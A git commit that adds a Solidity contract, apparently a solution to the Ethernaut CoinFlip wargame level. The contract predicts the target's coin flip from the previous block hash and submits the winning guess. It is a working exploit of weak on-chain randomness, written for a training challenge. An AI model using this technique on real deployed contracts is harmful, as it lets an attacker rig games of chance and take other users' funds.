539d9405ba3fc1f7e28a02358158aefa0f278726
0xDrogon <tiagofsdomingues@gmail.com>
2023-01-28 16:49:46 +0000

    adds solutions to coinflip

---
+++ coin-flip/Pwn.sol
@@ -0,0 +1,24 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Ethernaut.sol";
+
+contract Pwn {
+
+    CoinFlip private immutable target;
+    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _target) {
+        target = CoinFlip(_target);
+    }
+
+    function pwn() external {
+        require(target.flip(_guess()), "Wrong guess");
+    }
+
+    function _guess() private view returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        return coinFlip == 1 ? true : false;
+    }
+}
